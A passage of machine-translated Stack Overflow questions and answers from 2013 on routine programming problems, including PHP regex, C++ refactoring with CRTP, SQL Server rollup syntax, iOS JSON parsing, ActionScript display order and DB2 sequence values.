小提琴演示[在这里](http://phpfiddle.org/lite/code/sdk-u6g)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T12:15:17.627

```
$row['body']= "normal text [everythingheregone] after text ";
$start = '\[';
$end = '\]';
$msg = preg_replace('#'.$start.'.*?'.$end.'#s', '$1 [test] $3', $row['body']);
//output: normal text [test] after text done 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-12T12:20:18.653

我有一个正则表达式方法。正则表达式是：`\[.*?]`

```
<?php
$string = 'normal text [everythingheregone] after text ';
$pattern = '\[.*?]';
$replacement = '[test]'
echo preg_replace($pattern, $replacement, $string);
//normal text [test] after text
?> 
```

# java - 燃烧消耗大量内存

> ID：14832240
> 
> 赞同：0
> 
> 时间：2013-02-12T12:07:54.797
> 
> 标签：java, flex4, out-of-memory, blazeds

我正在使用 adobe flex4.6 和 blazeds4.0 与服务器通信。客户端与服务器生成 RMI。服务器返回一个由用户定义的类对象组成的数组列表。假设在 arrayList 中添加了 200000 个对象。当这个 arrayList 返回到 blazeds 时，它在 JVM 中消耗了大量内存，并且该客户端 Web 浏览器的内存使用量也增加了。而且占用的巨大内存不是JVM中的垃圾收集。随着更多请求的进入，这最终导致内存不足错误。下面列出了用于将 arrayList 发送到 blazeds 的示例代码。SampleClass 类有 3 个变量，每个变量都是 int 类型，带有 getter 和 setter。

```
List list = new ArrayList();
for(i=0;i<200000;i++)
{ SampleClass  sampleClassObj = new SampleClass();
  sampleClassObj.setId(1);
  sampleClassObj.setAge(20);
  sampleClassObj.setEmpId(100);
  list.add(sampleClassObj);
} 

return list; 
```

请立即回复解决方案，以避免在 blazeds 中消耗大量内存并垃圾收集该内存。

# c++ - 重构所有类共有的方法

> ID：14832249
> 
> 赞同：2
> 
> 时间：2013-02-12T12:08:33.133
> 
> 标签：c++, templates, refactoring, member-functions

我有一个全局函数，可以将一个对象（或 type `Source`）的相关位复制到另一个（ type `Target`），如下所示：

```
template<typename Source , typename Target>
void partialCopy( Source& source , Target& target )
{
    // perform copy
} 
```

我发现全局函数的问题是，与成员函数不同，在编码两个参数中哪个是源哪个是目标时，并不能立即清楚地知道。因此，我想`partialCopy()`在**每个**类中都有一个成员函数，如下所示：

```
struct Foo
{
    template<typename T>
    void partialCopy( T& target )
    {
        ::partialCopy( *this , target );
    }
}; 
```

现在的问题是成员函数必须复制到几十个类中。这是一个可以容忍的[复制和粘贴编程](http://en.wikipedia.org/wiki/Copy_and_paste_programming)案例吗？我考虑过放入`partialCopy`一个头文件`partialCopy.h`并使用预处理器包含将其“注入”到每个类中，如下所示：

```
struct Foo
{
    #include "partialCopy.h"
};

Foo f;
Bar b;
f.partialCopy( b ); 
```

虽然这是可行的，但我从未在任何地方见过它，也不知道它是否不可接受。

我已经尝试将`partialCopy`成员函数放在一个公共基类中并继承它，但这不起作用，因为`this`关键字将引用基类而不是派生类。

有更好的选择吗？请指教。

**编辑**

John 的建议（在一个已被删除的线程中）我`static_cast`对 CRTP 基类中的派生类执行一个很好的工作。@John 请发布这个答案，我会这样标记它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T12:17:16.037

*我将其发布为答案，因为在我看来这是合适的。不过，Henrik 首先发表了评论。（然而，这也是我的第一个想法:)）*

### 常量引用

使用`const&`(const-reference) 作为源参数。这样就很容易与目标区分开来。

额外的好处是它将验证并确保您的部分复制函数的 const 正确性。

### 右值引用

您可能还考虑为`Source&&`. 如果有一些直接复制的缓冲区，您的函数可能会使用它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-12T12:17:15.053

我建议为此重载流运算符。

例如

```
template<typename Source , typename Target>
void partialCopy(Source& source, Target& target)
{
    // perform copy
} 
```

有效地变成：

```
template<typename Source , typename Target>
void operator>>(const Source& source, Target& target)
{
    // perform copy
} 
```

（另请注意，为清楚起见，Source 参数现在是 const&。

所以你可以简单地写

```
Foo f;
Bar b;
f >> b; 
```

更清楚源对象和目标对象是什么。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T11:48:42.893

我对这个答案有点晚了，但我认为您可能对使用[CRTP](http://en.wikipedia.org/wiki/Curiously_recurring_template_pattern)作为复制粘贴编程的干净替代方案的解决方案感兴趣：

> 现在的问题是成员函数必须复制到几十个类中。这是一个可以容忍的复制和粘贴编程案例吗？我考虑将 partialCopy 放在头文件 partialCopy.h 中，并使用预处理器 include 将其“注入”到每个类中 [...]。

不要复制或#include代码，请考虑以下内容：

```
// common code:
<template typename T>
class PartialCopyImplementer
{
public:
    template<typename D>
    void partialCopy(D& destination)
    {
        // ::partialCopy( *this , target );
    }
};

// concrete implementations
class Foo1 : public PartialCopyImplementer<Foo1> // CRTP implementation
{
// ...
};

// concrete implementations
class Foo2 : public PartialCopyImplementer<Foo2> // CRTP ensures Foo1 and Foo2
                                                 // do not have a common base
{
// ...
}; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T12:40:06.627

关于什么：

```
template<class T>
struct from_impl
{
  T const& from;
  from_impl(T const& f) 
    : from(f)
  {}
};

template<class T>
from_impl<T> from(T const& f) {
  return from_impl(f);
}

template<class T>
struct to_impl
{
  T& to;
  to_impl(T& t) 
    : to(t)
  {}
};

template<class T>
to_impl<T> to(T& t) {
  return to_impl(t);
}
template<class T>
void to(T const&); // prevent using  with non-const values

template<class Source,class Target>
void partial_copy(from_impl<Source> source, to_impl<Target> target)
{
   // use source.from and target.to to perform copy
}

// usage:
T1 object1;
T2 object2;

partial_copy(from(object1),to(object2)); 
```

这很清楚你想要做什么。from_impl 和 to_impl 像一种引用一样工作，并且 from 和 to 像工厂函数一样工作，以便于使用。你也可以尝试实现类似的东西。

```
partial_copy.from(Source).to(Target);
partial_copy(Source)->_(Target); 
```

但通常这是很多写作。只需将 partial_copy 放在其自己的命名空间中以防止名称冲突，让用户自己进行自定义重载，并使用 const& 来指示源和目标是什么。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-12T12:33:04.327

最干净的方法可能就是将其`partialCopy`作为免费功能保留并以这种方式使用。这并没有本质上的错误，例如标准库[`<algorithm>`头文件](http://en.cppreference.com/w/cpp/algorithm)中的所有函数都是将与对象一起使用的自由函数。

`foo.partialCopy(bar)`哪个是源哪个是目的地也不是很清楚。`partialCopy`复制*from*还是*to* ？`bar`_ 通常，在这种情况下查看文档/函数声明很有用。如果您对参数有明确的名称并`const`在适当时进行命名，那么应该非常清楚对象被复制的方式。

# sql - '带汇总' sql 错误

> ID：14832254
> 
> 赞同：0
> 
> 时间：2013-02-12T12:08:41.473
> 
> 标签：sql, sql-server, sql-server-2005

我正在尝试编写带有分组的 sql 查询，但出现错误：-*关键字“with”附近的语法不正确。*

我正在写的查询如下： -

```
SELECT          CONTRACT,  
        PACONTNUMBER,  
        Project Manager ID,  
        Status,  
        Project Type,  
        Project Fee Amount,  
        Forecast Total Cost,  
        Forecast Profit,
        Forecast %,
        Actual Billings,
        Actual Total Cost,
        Current Actual Profit,
        Current %,
        GROUPING(PACONTNUMBER) as PACONTNUMBER,  
        SUM(Project Fee Amount) as Project Fee,
        SUM(Forecast Total Cost) as Forecast Cost,
        SUM(Forecast Profit) as Forecast Profit,
        SUM(Forecast %) as Forecast Percentage,
        SUM(Actual Billings) as Billings Total Actual,
        SUM(Actual Total Cost) as Total Cost Actual
FROM        dbo.vwPAProjects_Summary_New_2
GROUP BY   
        CONTRACT,    
        Project Manager ID,  
        Status,  
        Project Type,  
        Project Fee Amount,  
        Forecast Total Cost,  
        Forecast Profit,
        Forecast %,
        Actual Billings,
        Actual Total Cost,
        Current Actual Profit,
        Current %,
        PACONTNUMBER with rollup 
ORDER BY    GROUPING (PACONTNUMBER) 
```

谁能指出我试图让它发挥作用的正确方向？

非常感谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:16:16.793

标识符中不能有空格。对于 SQL Server，您可以用方括号括起来`[x]`，例如：

```
SELECT          
        CONTRACT,  
        PACONTNUMBER,  
        [Project Manager ID],
        Status,  
        [Project Type],  
        .
        .
        SUM([Actual Total Cost]) as [Total Cost Actual]
FROM        dbo.vwPAProjects_Summary_New_2
GROUP BY   
        CONTRACT,    
        [Project Manager ID],  
        .
        .
        PACONTNUMBER with rollup 
ORDER BY    GROUPING (PACONTNUMBER) 
```

# json - 如何在 iPad 中解析 JSON 值？

> ID：14832259
> 
> 赞同：0
> 
> 时间：2013-02-12T12:08:48.383
> 
> 标签：json, ipad, parsing, nsdictionary

使用 SBJSON 解析器从服务器解析 JSON 值，我收到了类似的响应

```
-(void)connectionDidFinishLoading:(NSURLConnection *)connection
{

 NSString *json_string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]; 
```

json_string 值在这里：

```
{ "status": true, "result": { "nid": "1116", "title": "PeopleSoft Enterprise HCM 91 Release Notes.pdf", "status": "1", "uid": "1", "body": "\x3cp\x3e\x3ca href=\"http://www.carinsuranceiseasy.com/\"\x3echeapest auto insurance\x3c/a\x3e wttig \x3ca href=\"http://www.lifeinsuranceshopping.net/\"\x3elife insurance quotes\x3c/a\x3e 304 \x3ca href=\"http://www.bestautoinsurancepolicies.net/\"\x3eaffordable auto insurance\x3c/a\x3e 39292\x3c/p\x3e", "splitpdfs": [  ], "mail": "gumpagain@gmail.com", "name": "admin", "pdf": "http://www.publishgenie.com/sites/default/files/pdf_convert/2012/12/19/1355908128-986.pdf", "page_number": "249", "filesize": 8936895, "referrallink": "http://www.publishgenie.com/index.php?q=ebook-referral/530/1116/19f80281e0ad314423afb51a5322e2ac" } } 
```

然后我尝试在 NSDictionary 中设置值，但字典值始终为空，如何解析这个？请帮我。

提前致谢

我试过这个：

```
SBJSON * parser = [[SBJSON alloc] init];
  NSDictionary *dic = (NSDictionary *)[parser objectWithString:json_string error:nil]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T18:05:49.387

您使用 SBJSON 是有原因的吗？您可以使用内置解析器：

```
id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error]; 
```

**编辑：** 你的 Json String 也是无效的。[您可以使用这样的网站来检查您的 json](http://jsonformatter.curiousconcept.com)

# android-widget - 更改 Android 模拟时钟颜色

> ID：14832262
> 
> 赞同：0
> 
> 时间：2013-02-12T12:08:55.427
> 
> 标签：android-widget

我尝试更改 AnalogClock 颜色。我想要黑色而不是白色。

任何人都知道我怎样才能覆盖这个小部件主题。

非常感谢 。

```
<AnalogClock
           android:id="@+id/analogClock1"
           android:layout_width="wrap_content"
           android:layout_height="wrap_content"
           android:layout_marginLeft="40dp"
           android:layout_marginTop="500dp" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-20T15:34:29.973

您可以更改表盘、hand_hour 和 hand_minute 的图像：

```
<AnalogClock
    android:id="@+id/analogClock1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    **android:dial="@drawable/my_dial_image"
    android:hand_hour="@drawable/my_hand_hour_image"
    android:hand_minute="@drawable/my_hand_minute_image"** /> 
```

爱德华多

连接-motion.com

# design-patterns - 应在计时器上调用的 DDD 应用程序服务调用的入口点

> ID：14832266
> 
> 赞同：0
> 
> 时间：2013-02-12T12:09:11.070
> 
> 标签：design-patterns, domain-driven-design

使用我的 DDD 模型，我拥有托管特定用户故事并允许组织存储库/实体/域服务的应用程序服务 - 据我了解，这是域驱动设计分层的常见部分，如下所示：

![DDD 层](../Images/07c52da829a9d5153efc05845d93f7c0.png)

我需要按定时计划调用应用程序服务，该计划是在从作业存储库获得的模型本身中定义的。对这篇文章的评论请提到让存储库返回 GetPendingJobs() 以及要运行的作业列表。

每个作业都需要一个 cron 作业字符串，并将调用一个应用程序服务（例如 SyncAccounts）。

我的问题是：

1.  我知道我们可以在线程上轮询它，但是它会放在哪里，在实体域服务中，或者作为域模型外部的东西（可能是应用程序和表示之间的层）？

2.  正如在返回 GetPendingJobs() 的作业存储库的评论中提到的，如果这是基于当前日期/时间，那么存储库是否有责任知道何时运行，或者作业实体（检查当前日期时间与它的 cronjob 字符串）？

下面的代码：

```
namespace DomainServices
{
    public class JobSchedule
    {
        private readonly JobsRepository repo;

        JobSchedule(JobsRepository repo)
        {
            this.repo = repo;
        }

        public void Poll()
        {
            var jobs = this.repo.GetAllJobs();

            foreach(var job in jobs)
            {
                if(job.IsTimeToRun())
                    job.Run();      
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T17:45:25.580

1.  这个逻辑是一个操作问题，因此属于应用层。然而，这可以根据工作的性质以多种方式实现。作业是否需要在自己的进程中运行？如果是这样，那么您可能希望使用 Windows 服务进行托管。如果作业可以作为主应用程序进程的一部分运行，则运行器本身可以是后台应用程序服务。

2.  该`GetPendingJobs`方法可以根据当前或提供的时间返回作业，在这种情况下，它有效地知道哪些作业必须在何时运行。但是，规范信息与作业本身相关联 - 存储库只是查询它。

# actionscript-3 - 如何在动作脚本 3 中将一个影片剪辑放在另一个影片剪辑之上

> ID：14832275
> 
> 赞同：1
> 
> 时间：2013-02-12T12:09:48.893
> 
> 标签：actionscript-3, flash, z-index, addchild

所以，假设我在代码的开头，当我稍后在代码中添加更多内容时`addChild(mc1);`，如何保持它的顶部？`addChild(mc2);`默认情况下 mc2 将覆盖 mc1 ...我已经尝试过 z-indexes，但我还没有完全掌握如何在我的情况下使用它...帮助？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:54:32.390

A couple of suggestions:

1.  Use `addChildAt(mc1, 0)` `addChildAt(mc2, 1)`. You can use `addChildAt` to state a specific 'layer' to add a movieclip to.

2.  Whenever you add anything else, re-add the movieclip you want to keep on top, ie:

    addChild(mc1); // adds first mc

    addChild(mc2); // adds second mc on top of first

    addChild(mc1); // re-draws mc1 to the top layer (does not add again, just brings to top!)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T00:25:02.553

您还可以在“mc1”下创建一个父精灵，然后将“mc2”和其他所有内容添加到该父级。该父精灵下的任何内容都将始终保留在 mc1 下，您无需担心手动将 mc1 移动到显示堆栈的前面。

```
// during when mc1 is first added
var parentSprite:Sprite = new Sprite();
this.addChild(parentSprite);
this.addChild(mc1);

// later in your code, whatever is added to "parentSprite" will always be displayed under mc1
parentSprite.addChild(mc2);
parentSprite.addChild(mc3);
parentSprite.addChild(mc4);
.
.
.
etc 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:15:23.360

电影剪辑在他们的类中有一个三坐标系统，所以除非我弄错了，你可以尝试将 mc1.z 更改为高于 mc2.z

# jquery - jquery：第二次点击

> ID：14832281
> 
> 赞同：0
> 
> 时间：2013-02-12T12:10:12.793
> 
> 标签：jquery, animation, click, return-value, jquery-click-event

我在单击切换动画时遇到问题-例如，当您单击一次并且元素向下移动时，第二次单击该元素又向上移动。我尝试了 .toggle 但没有成功，并提出了这个想法：

我有一个功能可以将“轮播”（这是一个按钮）向下移动 10px [我使用传输插件]：

```
function carousel_4way (n, el) {

    // remove outline from clicked element
    el.blur();

    // animation
    var carousel = '#carousel-4way-nav-' + n
    var carousel_content = '#carousel-4way-' + n
        $(carousel_reset).hide();
        $(carousel).transition(
        {y: '+=10'}

        ); 
```

然后我点击这些轮播之一：

```
$('#carousel-4way-nav-1').click(function(event){
    return carousel_4way(1, this);
    event.preventDefault();
}); 
```

它计算得非常好，我只需要为我想要动画的每个按钮定义所有点击。

这样我动画按钮向下移动 10px {y: '+=10'} 但是我想再次点击它们向上移动所以 {y: '-=10'} 是我需要的。

我混合了这样的东西：

```
function carousel_4way (n, el, m) {
$(carousel).transition(
    {y: m + '=10'}
    );

$('#carousel-4way-nav-1').click(function(event){
return carousel_4way(1, this, '+');
event.preventDefault();
}); 
```

现在我只需要添加另一个 return carousel_4way(1, this, '-'); 这就是我被困的地方。可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:13:42.513

你的意思是这样的：

```
var transitionState = '-'; // this should be global

// the following will always evaluate to what transitionState currently is not (toggle)
return carousel_4way(1, this, (transitionState == '-') ? '+' : '-'); 
```

只要确保`transitionState`在`carousel_4way`.

# actionscript-3 - addChild 在函数内部不起作用

> ID：14832284
> 
> 赞同：1
> 
> 时间：2013-02-12T12:10:23.283
> 
> 标签：actionscript-3, flash-cs5

我在程序中使用 addChild 时遇到问题，文档类如下所示：

```
public function gridtest()
    {
        turn++;
        var plusX = 1;
        var plusY = 0;

        trace ("game started");

        var i;
        var j;

        for (i = 0; i < 5; i++)
        {
            trace ("first for loop");

            for (j = 0; j < 8; j++)
            {
                gridbutton = new GridButton();

                gridbutton.x += plusX;
                gridbutton.y += plusY;
                gridbutton.GBID = (i*10)+ j;

                trace ("created button at " + plusX + "," + plusY);

                addChild(gridbutton);
                GBList.push(gridbutton);
                trace("grid button number " + i + j + " added");
                plusX += 92.5;
            }

            plusY += 61.5;
            plusX = 1;
        }
    } 
```

我在主函数gridtest（）中有一个addChild，它工作正常，但另一个在第二个函数中（仍然是同一个文档）：

```
 static function NewUnit(locX, locY)
    {
    unit = new Unit(locX, locY);
    unit.Set_ID(UnitList.length);
    addChild(unit);
    UnitList.push(Unit);
    } 
```

给我错误1180：调用可能未定义的方法addChild，它与静态函数有关吗？或者是完全不同的东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-12T12:19:22.327

[addChild](http://livedocs.adobe.com/livecycle/es/sdkHelp/common/langref/flash/display/DisplayObjectContainer.html#addChild%28%29)是一个非静态函数。静态和非静态函数之间的交互不可用。您应该首先引用 Object 的实例并从该实例调用函数。请检查`trace(this);`静态函数。

如果你想要对象 addChild。应该为要添加的父级添加一个附加参数。

```
static function NewUnit(locX:Number, locY:Number, parent:DisplayObjectContainer)
{
    unit = new Unit(locX, locY);
    unit.Set_ID(UnitList.length);
    parent.addChild(unit);
    UnitList.push(Unit);
} 
```

# html - 垂直对齐 HTML 列表中的文本

> ID：14832296
> 
> 赞同：1
> 
> 时间：2013-02-12T12:11:15.197
> 
> 标签：html, css, twitter-bootstrap

在[此页面](http://festivals.ie:8080/aviation/)的右侧边栏中有一个菜单，该菜单由具有以下结构的 HTML 列表组成：

```
<ul class="nav nav-pills nav-stacked">
    <li class="active">
        <a href="index.html"><i class="icon-home"></i> Home</a>
    </li>
    <li>
        <a href="development.html">Development</a>
    </li>
    <li>
        <a href="management.html">Management</a>
    </li>
    <li>
        <a href="learning.html">Learning</a>
    </li>

    <!-- more menu entries -->
</ul> 
```

请注意，一些菜单项在标签左侧有（字体）图标，而其他菜单项则没有。这使得菜单看起来相当难看，因为标签没有垂直对齐。

有什么方法可以垂直对齐标签，理想情况下不引入额外的 HTML 元素（因为这会弄乱 Bootstrap 本身定义的一些直接后代规则）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:16:02.020

试试这个：

```
.nav-pills.nav-stacked > li > a {
  padding-left: 25px;
}

.nav-pills.nav-stacked > li > a > i {
  position: absolute;
  margin-left: -25px;
} 
```

它将图标从流中取出，将文本放在右侧 25px 处，然后将图标放置在左侧 25px 处

# android - 将背景塑造为图像

> ID：14832300
> 
> 赞同：0
> 
> 时间：2013-02-12T12:11:51.693
> 
> 标签：android, xml

我正在尝试将形状颜色设置为图像，但没有这样做。也许有人可以告诉我如何以正确的方式做到这一点？我使用这个形状作为按钮的背景。

```
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android"

     android:shape="rectangle">

    <corners android:bottomRightRadius="7dp"
        android:bottomLeftRadius="7dp" 
        android:topLeftRadius="7dp"
        android:topRightRadius="7dp"/>

        <stroke
        android:width="0.5dp"
        android:color="#ff0000" />

        <solid android:color= "@drawable/tableback1" />
</shape> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:30:21.777

因为您可以将颜色的起始两个值设置为 alpha，例如总共 8 位数字

```
#00ffaa44 // here is the fully transparent

#88ffaa44 // semi transparent

#ffffaa44 // fully opaque 
```

您可以根据您的要求使用 alpha 值保持颜色

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:20:10.110

这在您提出问题的方式中是不可能的。

根据此处的文档：http: [//developer.android.com/guide/topics/resources/drawable-resource.html#Shape](http://developer.android.com/guide/topics/resources/drawable-resource.html#Shape) `solid.color`属性值必须是*color 而不是 drawable*。此颜色用作整个形状的填充。你正在传递一个`drawable`在这里看到的：

```
<solid android:color= "@drawable/tableback1" /> 
```

相反，它应该是这样的：

```
<solid android:color="@color/background_color1" /> 
```

或者简单地说：

```
<solid android:color="#ffff0000" /> 
```

# css - 加载时不显示 IE7 中的背景图像

> ID：14832302
> 
> 赞同：0
> 
> 时间：2013-02-12T12:11:54.293
> 
> 标签：css, internet-explorer

我知道标题看起来可能已经有人问过这个问题，但是在搜索了很多之后，我找不到我的答案，所以我问这个。我也在其他几个地方找到了，但我找不到合适的解决方案。我想，我可以在这里得到帮助。

我有一个输入类型的文本框字段，我正在使用 javascript 在它周围动态添加一个 div。这个 div 有一个 class="errorFieldIcon" 属性。我的 css 文件中有这个类定义。

当我尝试在 IE7 开发人员工具中调试它时，我发现这个类的代码反映在 Style 选项卡中。但是，当我看到页面时，样式效果并没有反映在页面上。我注意到，如果我只是去开发人员工具并取消选中/选中样式选项卡中的任何 CSS 属性，我就能看到这张图片。

这对我来说非常令人惊讶，因为我第一次注意到这样的问题。每当加载页面时，它都不会显示图像/图标，但是当我取消选中或选中任何 CSS 属性时，它就会开始显示图像。

**我的班级代码是**

```
.errorFieldIcon{
    background-image: url("../images/IcoMessageError.gif");
    height: 16px;
    left: -18px;
    position: absolute;
    top: 3px;
    width: 16px;
}

.errorFieldIcon {
    background-image: url("../img/ico_error.png");
    background-repeat: no-repeat;
} 
```

**代码**

```
<TD class="DefaultFontBlack errorHighlight" vAlign=center colSpan=2 align=left>
 <DIV id=etvErrIcon class=errorFieldIconOwner>
  <DIV class=errorFieldIcon>
  </DIV>
 </DIV>
 <INPUT value=123# type=text name=SITE_DK_NUMBER_RULE>
</TD> 
```

如果您需要更多信息，我可以提供。由于我在本地运行它，我无法提供链接。但我觉得这个描述应该足够了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:29:23.510

当涉及到不正确的 HTML 时，IE7 非常“挑剔”。如果您使用正确的 HTML，可以纠正很多错误，阻止浏览器进入[quirks 模式](http://en.wikipedia.org/wiki/Quirks_mode)。

用户小写 HTML，引用您的属性，使用 doctype。

检查您的 CSS，为同一元素/类设置 2 个图像，因此根据您提供的 CSS，您只会看到最后一个：

```
.errorFieldIcon {
  background-image: url("../img/ico_error.png");
  background-repeat: no-repeat;
} 
```

在你的 CSS 中，是否有一个`position: relative`for `.errorFieldIconOwner`，也许是因为绝对定位，你看不到图像？

# javascript - 获取已经选择的文本

> ID：14832307
> 
> 赞同：0
> 
> 时间：2013-02-12T12:12:11.733
> 
> 标签：javascript, jquery

通过使用以下代码，我得到了所选文本的 startindex 和所选文本本身。我将它们存储在本地数据库中。我正在将选定的文本背景颜色更改为黄色。

```
var mainDiv = document.getElementsByTagName("body")[0];
var sel = getSelectionCharOffsetsWithin(mainDiv);

var selectedText = window.getSelection();

location.href =  selectedText + '*' + sel.start; // this is to call iOS function.

var range = window.getSelection().getRangeAt(0);
var span = document.createElement("span");
span.style.backgroundColor = "yellow";
span.setAttribute("id", sel.start);
range.surroundContents(span); 
```

现在，我正在做其他事情，然后我又回到了同一页。现在我想将以前选择的文本显示为突出显示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:23:13.107

使用 Rangy ，没有什么比它更好的了，完全按照您的尝试

[朗吉](https://www.google.co.in/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&ved=0CDgQFjAB&url=http://code.google.com/p/rangy/&ei=ATQaUdK_AsnorQeXi4DwDg&usg=AFQjCNGaVUHBkBJ67kgi-XhKZlK7jedZZg&bvm=bv.42261806,d.bmk)

看看这个[演示](http://rangy.googlecode.com/svn/trunk/demos/index.html)

# c# - 多层按钮/环形按钮

> ID：14832313
> 
> 赞同：0
> 
> 时间：2013-02-12T12:12:23.763
> 
> 标签：c#, wpf

我需要创建自定义按钮。这将是一个带环的圆圈，每个环都是单独的按钮。按钮文本将显示在环上。您可以在下面找到按钮的外观图像。

[http://imageshack.us/photo/my-images/90/ringbutton.png](http://imageshack.us/photo/my-images/90/ringbutton.png)

我想知道是否可以使用 VS 和 WPF 创建这种按钮。

我需要第三方库吗？有类似按钮的例子吗？

* * *

正如我之前写的那样，我将不同大小的圆形按钮一个接一个地放置，并且工作得像梦一样。但我仍然无法在创建的“环”上显示一些文本。

我曾使用路径在环上显示文本，但很复杂（对我而言）和文本封面按钮，因此我无法单击文本所在的位置。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:16:50.333

您可以将图像放在表单上并实现 Click() 事件。它与“真正的”按钮真的没有什么不同。

# java - 使用 Java 的 DB2 序列值

> ID：14832314
> 
> 赞同：5
> 
> 时间：2013-02-12T12:12:29.157
> 
> 标签：java, jdbc, db2

我需要从 DB2 序列中获取下一个值。这是我尝试过的一种方法

```
stmt = con.createStatement();
rs = stmt.executeQuery("db2 VALUES NEXTVAL FOR <sequence_name>"); 

rs.close();
stmt.close(); 
```

我得到的错误如下：

```
com.ibm.db2.jcc.c.SqlException: [ibm][db2][jcc][10103][10941] Method executeQuery cannot be used for updates.
           at com.ibm.db2.jcc.c.qh.a(qh.java:2390)
           at com.ibm.db2.jcc.c.qh.a(qh.java:1751)
           at com.ibm.db2.jcc.c.qh.a(qh.java:478)
           at com.ibm.db2.jcc.c.qh.executeQuery(qh.java:462)
           at test.pack.SequenceConn.getNextSequenceValue(SequenceConn.java:59)
           at test.pack.SequenceConn.main(SequenceConn.java:22) 
```

如何从序列中检索下一个值？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T12:57:45.983

设法自己解决了这个问题。

```
stmt = con.createStatement();
rs = stmt.executeQuery("VALUES NEXTVAL FOR <sequence_name>"); 

rs.close();
stmt.close(); 
```

基本上，查询字符串中的前面`db2`是导致问题的原因。删除它并能够获取序列值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:16:10.637

您可以使用以下语句来检索 DB2 中序列的下一个值：

```
stmt = con.createStatement();
rs = stmt.executeQuery("SELECT NEXT VALUE FOR <sequence_name>"); 
if(rs.next()) {
    Long sequenceValue = rs.getLong(1);
}
rs.close();
stmt.close(); 
```

正如[DB2 Reference 关于 Sequences 的章节](http://publib.boulder.ibm.com/infocenter/db2luw/v9/index.jsp?topic=%2Fcom.ibm.db2.udb.admin.doc%2Fdoc%2Fr0023464.htm)中所指定的那样。

> **NEXT VALUE FOR sequence-name**
>         NEXT VALUE 表达式生成并返回由 sequence-name 指定的序列的下一个值。
> ...
> - NEXT VALUE 和 PREVIOUS VALUE 表达式可以在以下位置指定：
>          · select-statement 或 SELECT INTO 语句（在 select-clause 中，前提是该语句不包含 DISTINCT 关键字、GROUP BY 子句、 ORDER BY 子句、UNION 关键字、INTERSECT 关键字或 EXCEPT 关键字）

# android - 通过 Facebook 提要对话框发布到几个朋友的时间线

> ID：14832319
> 
> 赞同：2
> 
> 时间：2013-02-12T12:13:08.230
> 
> 标签：android, facebook

由于请求“id/feed”已被弃用，我正在尝试实现 Facebook 提要对话框以发布到用户的朋友时间线。

我在文档参数“to”中找到，我可以在其中定义用户发布到的 ID。

但是，如果我想向多个朋友发布一条消息，我该怎么做呢？

我正在尝试使用“user_id_1，user_id_2，user_id_3”之类的东西，但它不起作用。

# ios - 尝试在设备上调试时 MonoDevelop 失败

> ID：14832322
> 
> 赞同：0
> 
> 时间：2013-02-12T12:13:17.870
> 
> 标签：ios, debugging, deployment, xamarin.ios, monodevelop

我正在尝试在我的设备上安装我正在开发的 iOS 应用程序，但每次尝试 MonoDevelop 时都会崩溃。首先 CPU 使用率达到峰值，然后停止响应。当调试器尝试连接到设备时，它似乎失败了。该应用程序已安装在设备上，我可以使用该应用程序，但我需要查看应用程序输出。

我正在使用最新版的 MonoDevelop 和 6.0.0 版的 MonoTouch。有没有其他有相同经历的用户解决了这个问题？

**编辑**

这是来自 monodevelop 的版本信息。我不得不像对待代码一样对待它，因为否则 stackoverflow 编辑器会使它变得不可读。

```
MonoDevelop 3.1.1
Installation UUID: cf274ee7-dfe8-4ba8-b44c-2c7a0d9a45ab
Runtime:
    Mono 2.10.9 (tarball)
    GTK 2.24.10
    GTK# (2.12.0.0)
    Package version: 210090011
Apple Developer Tools:
     Xcode 4.5.2 (1847)
     Build 4G2008a
Monotouch: 6.0.6
Mono for Android: 4.4.55
Android SDK: /Users/.../Library/Developer/Xamarin/android-sdk-mac_x86
    Supported Android versions:
        2.1 (API level 7)
        2.2 (API level 8)
        2.3 (API level 10)
        3.1 (API level 12)
        4.0 (API level 14)
        4.1 (API level 16)
        4.2 (API level 17)
Java SDK: /usr
Xamarin.Mac: Not Installed
Build information:
    Release ID: 30101000
    Git revision: 5d928ec4f9d5864b4db04a1301b8a8649b43fb9d
    Build date: 2012-12-14 19:11:30+0000
    Xamarin addins: 80f2dcc8fe4ed316b3e77dde496fc33d90305047
Operating System:
    Mac OS X 10.8.2
    Darwin ---.local 12.2.0 Darwin Kernel Version 12.2.0
        Sat Aug 25 00:48:52 PDT 2012
        root:xnu-2050.18.24~1/RELEASE_X86_64 x86_64 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-18T12:48:39.407

过去，我在使用模拟器不可用的库时得到了很多。对我来说，它（可能）与 USB 链接有关。你应该尝试什么：

